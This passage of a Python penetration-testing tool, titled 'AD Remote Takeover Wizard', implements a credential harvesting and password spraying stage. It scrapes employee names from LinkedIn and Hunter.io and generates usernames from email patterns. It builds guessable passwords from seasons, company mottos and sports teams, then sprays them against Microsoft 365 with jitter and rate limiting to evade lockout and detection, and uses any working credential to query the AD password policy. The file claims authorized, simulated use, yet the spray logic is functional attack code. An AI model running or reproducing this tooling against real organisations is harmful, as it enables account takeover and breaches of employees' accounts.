        key = self._get_rate_limit_key(target)
        now = time.time()
        self.job.rate_limit_next_allowed.setdefault(key, now)
        time_needed = max(0, self.job.rate_limit_next_allowed[key] - now)

        if time_needed > 0:
            print(f"Rate limited for '{key}'. Waiting {time_needed:.2f}s.")
            time.sleep(time_needed)
            if ABORT_EVENT.is_set():
                return False

        interval = 60.0 / rate_per_minute
        self.job.rate_limit_next_allowed[key] = now + interval
        jitter = self.config.get("opsec", {}).get("jitter_seconds", 0)
        if jitter > 0:
            time.sleep(random.uniform(0.01, jitter))
        return True

    def credential_harvest_spray(self) -> bool:
        """Harvests usernames and performs credential spraying."""
        if ABORT_EVENT.is_set():
            return False

        print("\n--- 3 - Credential Harvest & Spray ---")
        self._log_audit({"event": "Starting Credential Harvest", "timestamp": str(datetime.datetime.now())})

        self.job.harvest_results = {
            "usernames": [],
            "password_list": [],
            "cracked_credentials": [],
            "lsass_dumps": [],
            "krbtgt_hash": None,
            "domain_sid": None,
            "password_policy": {}
        }

        username_list = set()
        username_config = self.config.get("credential_harvest_spray", {}).get("username_generation", {})
        USERNAME_CLEANUP = re.compile(r'[^a-zA-Z0-9_\-.@]')

        linkedin_config = username_config.get("linkedin_scrape", {})
        if linkedin_config.get("enabled", False):
            print("Scraping LinkedIn...")
            scraper_path = self._get_tool_path('linkedin_scraper')
            if scraper_path:
                company_safe = "".join(unicodedata.normalize('NFKD', self.job.company).casefold().split())
                output_file = pathlib.Path(self.job.results_dir) / self.config.get("results_subdir", "results") / f"{self.job.uuid}_{company_safe}_linkedin_names.csv"
                if self._create_directories(output_file.parent):
                    command = [str(scraper_path), '--company', self.job.company, '--output-file', str(output_file)]
                    stdout, stderr = self._execute_command(command, timeout=linkedin_config.get("timeout", 300))
                    if output_file.exists():
                        with open(output_file, 'r') as f:
                            reader = csv.reader(f)
                            for row in reader:
                                if ABORT_EVENT.is_set():
                                    break
                                if row and row[0].strip():
                                    username_list.add(row[0].strip())
                        self._log_audit({"event": "LinkedIn Scrape Complete", "count": len(username_list), "file": str(output_file), "timestamp": str(datetime.datetime.now())})

        hunterio_config = username_config.get("hunterio", {})
        if hunterio_config.get("enabled", False):
            print("Adding Hunter.io emails...")
            if self.job.recon_results.get("hunterio_emails"):
                username_list.update(self.job.recon_results["hunterio_emails"])
                self._log_audit({"event": "Hunter.io Emails Added", "count": len(self.job.recon_results["hunterio_emails"]), "timestamp": str(datetime.datetime.now())})

        collected_names = list(username_list) + username_config.get("common_names", [])
        collected_names = list(set(name.strip() for name in collected_names if name.strip()))

        patterns = username_config.get("email_patterns", ["{first}.{last}@{domain}", "{f}{last}@{domain}"])
        generated_usernames = set()
        for domain in self.job.target.root_domains:
            for name in collected_names:
                if ABORT_EVENT.is_set():
                    break
                if '@' in name:
                    name_part, domain_part = name.split('@', 1)
                    if domain_part.lower() != domain.lower():
                        continue
                    name_part = USERNAME_CLEANUP.sub('', name_part)
                    name_parts = name_part.replace('.', ' ').replace('_', ' ').split()
                    first = name_parts[0] if name_parts else ""
                    last = name_parts[-1] if len(name_parts) > 1 else ""
                    generated_usernames.add(name)
                else:
                    name_parts = name.replace('.', ' ').replace('_', ' ').split()
                    first = name_parts[0] if name_parts else ""
                    last = name_parts[-1] if len(name_parts) > 1 else ""

                if first:
                    for pattern in patterns:
                        try:
                            username = pattern.replace("{first}", first).replace("{last}", last).replace("{f}", first[0] if first else "").replace("{l}", last[0] if last else "").replace("{domain}", domain)
                            username = USERNAME_CLEANUP.sub('', username)
                            if username and ("@" in pattern) == ("@" in username):
                                generated_usernames.add(username)
                        except Exception:
                            pass

        manual_list_path = pathlib.Path(username_config.get("manual_list_path", ""))
        if manual_list_path.is_file():
            try:
                with open(manual_list_path, 'r') as f:
                    username_list.update(line.strip() for line in f if line.strip())
                self._log_audit({"event": "Manual List Loaded", "path": str(manual_list_path), "timestamp": str(datetime.datetime.now())})
            except Exception as e:
                print(f"Error reading {manual_list_path}: {e}")
                self._log_audit({"event": "Manual List Error", "path": str(manual_list_path), "error": str(e), "timestamp": str(datetime.datetime.now())})

        username_list.update(generated_usernames)
        self.job.harvest_results["usernames"] = list(username_list)
        self._log_audit({"event": "Username Generation Complete", "count": len(self.job.harvest_results["usernames"]), "timestamp": str(datetime.datetime.now())})

        password_config = self.config.get("credential_harvest_spray", {}).get("password_spray", {})
        password_list = set()
        if password_config.get("enabled", False):
            regional_seasons = password_config.get("regional_seasons", [])
            company_mottos = password_config.get("company_mottos", [])
            sport_teams = password_config.get("sport_teams", [])
            common_patterns = password_config.get("common_patterns", ["{word}{year}{ending}"])
            common_endings = password_config.get("common_endings", ["!", "1", "123"])
            years = [datetime.datetime.now().year - i for i in range(password_config.get("past_years_count", 3))]
            common_weak = password_config.get("common_weak_passwords", [])

            words = set(word.strip() for word in (regional_seasons + company_mottos + [t.replace(" ", "") for t in sport_teams]) if word.strip())
            PASSWORD_CLEANUP = re.compile(r'[^a-zA-Z0-9!@#$%^&*()-+=.,?/:;\'"{|}\\[\]~ ]')
            for word in words:
                for year in years:
                    for ending in common_endings:
                        for pattern in common_patterns:
                            if ABORT_EVENT.is_set():
                                break
                            try:
                                pwd = pattern.format(word=word, year=year, ending=ending)
                                pwd = PASSWORD_CLEANUP.sub('', pwd)
                                if pwd:
                                    password_list.add(pwd)
                            except KeyError:
                                pass
            password_list.update(common_weak)

        self.job.harvest_results["password_list"] = list(password_list)
        self._log_audit({"event": "Password List Generated", "count": len(self.job.harvest_results["password_list"]), "timestamp": str(datetime.datetime.now())})

        spray_config = self.config.get("credential_harvest_spray", {}).get("password_spray", {})
        if spray_config.get("enabled", False) and self.job.harvest_results["usernames"] and self.job.harvest_results["password_list"]:
            print("\nExecuting credential spray...")
            spray_targets = [t.strip().lower() for t in spray_config.get("target_services", []) if t.strip()]
            if not spray_targets:
                print("No target services for spray.")
                self._log_audit({"event": "No Spray Targets", "timestamp": str(datetime.datetime.now())})
                return True

            rate_per_minute = spray_config.get("rate_per_minute", 1)
            attempt_timeout = spray_config.get("attempt_timeout", 30)
            random.shuffle(self.job.harvest_results["usernames"])
            random.shuffle(self.job.harvest_results["password_list"])

            suitable_cred = None
            suitable_cred_pwd = None

            for password in self.job.harvest_results["password_list"]:
                if ABORT_EVENT.is_set():
                    break
                if any(cred.hash_sha256 == hashlib.sha256(password.encode()).hexdigest() for cred in self.job.harvest_results["cracked_credentials"]):
                    continue
                print(f"Spraying password: {password[:5]}...")
                for username in self.job.harvest_results["usernames"]:
                    if ABORT_EVENT.is_set():
                        break
                    if any(cred.username == username and cred.hash_sha256 == hashlib.sha256(password.encode()).hexdigest() for cred in self.job.harvest_results["cracked_credentials"]):
                        continue
                    for target in spray_targets:
                        if not self._acquire_token(target, rate_per_minute):
                            continue
                        self._log_audit({"event": "Spray Attempt", "target": target, "user": username, "password_hash_prefix": hashlib.sha256(password.encode()).hexdigest()[:8], "timestamp": str(datetime.datetime.now())})
                        if target == "m365":
                            aad_spray_path = self._get_tool_path('aad_spray_tool')
                            target_domain = self.job.target.suspected_cloud_tenant or (self.job.target.root_domains[0] if self.job.target.root_domains else None)
                            if not target_domain or not aad_spray_path:
                                self._log_audit({"event": "M365 Spray Skipped", "reason": "No domain or tool", "timestamp": str(datetime.datetime.now())})
                                continue
                            try:
                                command = [str(aad_spray_path), '--domain', target_domain, '--username', username, '--password', password]
                                stdout, stderr = self._execute_command(command, timeout=attempt_timeout)
                                if "SUCCESS" in stdout.upper():
                                    cred = Credential(username=username, password=password, service=target, type="plaintext", source="spray")
                                    if "MFA" in stdout.upper():
                                        cred.mfa = True
                                    else:
                                        # Store first non-MFA plaintext cred for policy check
                                        if not suitable_cred:
                                            suitable_cred = cred
                                            suitable_cred_pwd = password
                                    self.job.harvest_results["cracked_credentials"].append(cred)
                                    self._log_audit({"event": "Credential Found", "credential": cred.__dict__, "timestamp": str(datetime.datetime.now())})
                                    print(f"Found: {username} for {target}{' with MFA' if cred.mfa else ''}")
                            except Exception as e:
                                print(f"Error spraying {username} on {target}: {e}")
                                self._log_audit({"event": "M365 Spray Error", "error": str(e), "timestamp": str(datetime.datetime.now())})

            # Password policy check
            if suitable_cred and suitable_cred_pwd and self.job.target.potential_ad_hosts:
                print("Retrieving password policy...")
                get_ad_policy_path = self._get_tool_path('get_ad_policy')
                if get_ad_policy_path:
                    try:
                        command = [str(get_ad_policy_path), '--target', self.job.target.potential_ad_hosts[0], '--username', suitable_cred.username, '--password', suitable_cred_pwd]
                        stdout, stderr = self._execute_command(command, timeout=password_config.get("policy_check_timeout", 60))
                        if "MinPasswordLength" in stdout:
                            policy = {"MinPasswordLength": int(re.search(r"MinPasswordLength\s*:\s*(\d+)", stdout).group(1))} if re.search(r"MinPasswordLength\s*:\s*(\d+)", stdout) else {}
                            self.job.harvest_results["password_policy"] = policy
                            if policy.get("MinPasswordLength"):
                                password_list = {p for p in password_list if len(p) >= policy["MinPasswordLength"]}
                                self._log_audit({"event": "Password List Filtered", "policy": policy, "new_count": len(password_list), "timestamp": str(datetime.datetime.now())})
                        else:
                            print("Could not retrieve password policy.")
                            self._log_audit({"event": "Password Policy Failed", "error": stderr, "timestamp": str(datetime.datetime.now())})
                    except Exception as e:
                        print(f"Password policy error: {e}")
                        self._log_audit({"event": "Password Policy Error", "error": str(e), "timestamp": str(datetime.datetime.now())})

            # Clear all plaintext passwords from memory
            suitable_cred_pwd = None
            for cred in self.job.harvest_results["cracked_credentials"]:
                cred.password = None

        self._log_audit({"event": "Credential Harvest Complete", "cracked_count": len(self.job.harvest_results["cracked_credentials"]), "timestamp": str(datetime.datetime.now())})
        print(f"Cracked credentials: {len(self.job.harvest_results['cracked_credentials'])}")
        for cred in self.job.harvest_results["cracked_credentials"]:
            print(f"  - User: {cred.username[:20]}..., Service: {cred.service}{' (MFA)' if cred.mfa else ''}, Hash: {cred.hash_sha256[:8]}...")
        return True

    def run(self):
        """Executes the wizard stages."""
        try:
            if not self.gatekeeper():
                self._abort_wizard("Gatekeeper failed.")
            global job_context
            job_context = self.job

            if self.target_definition() and self.recon_surface_mapping() and self.job.status != "halted_after_recon":
                self.credential_harvest_spray()
                print("Note: Cloud pivot, RCE, and privilege escalation modules are not implemented.")

            if self.job and self.job.status == "running":
                self.job.status = "completed"
                self.job.timestamp_end = str(datetime.datetime.now())
        except Exception as e:
            print(f"Unhandled exception: {e}")
            import traceback
            self._log_audit({"event": "Unhandled Exception", "error": str(e), "traceback": traceback.format_exc(), "timestamp": str(datetime.datetime.now())})
            if self.job:
                self.job.status = "failed"
                self.job.timestamp_end = str(datetime.datetime.now())
        finally:
            self._cleanup_temp_files()
            if self.job:
                self._log_audit({"event": "Wizard Complete", "status": self.job.status, "timestamp": str(datetime.datetime.now())})
                print(f"\n--- Wizard Complete ---")
                print(f"UUID: {self.job.uuid}")
                print(f"Audit log: {self.job.audit_log_path}")
                print(f"Results: {self.job.results_dir}")
                print(f"Status: {self.job.status}")

def load_config(config_path: str) -> Dict[str, Any]:
    """Loads and validates the YAML configuration."""
    try:
        with open(config_path, 'r') as f:
            config = yaml.safe_load(f)
        if not isinstance(config, dict):
            raise ValueError("Invalid YAML configuration.")
        return config
    except Exception as e:
        print(f"Error loading config {config_path}: {e}")
        return {}

if __name__ == "__main__":
    print("AD Remote Takeover Wizard (Simulation Mode - Authorized Use Only)")
    parser = argparse.ArgumentParser(description="AD Remote Takeover Wizard")
    parser.add_argument("--config", default="wizard.yaml", help="Path to YAML config.")
    parser.add_argument("--engagement-letter", required=True, help="Path to engagement letter PDF.")
    parser.add_argument("--company-name", required=True, help="Target company name.")
    parser.add_argument("--testing-window", required=True, help="Testing window (e.g., 'YYYY-MM-DD to YYYY-MM-DD').")
    parser.add_argument("--run-uuid", default=str(uuid.uuid4()), help="Run UUID.")

    args = parser.parse_args()
    config = load_config(args.config)
    if not config:
        sys.exit(1)

    wizard = Wizard(config=config, args=args)
    job_context = None
    wizard.run()
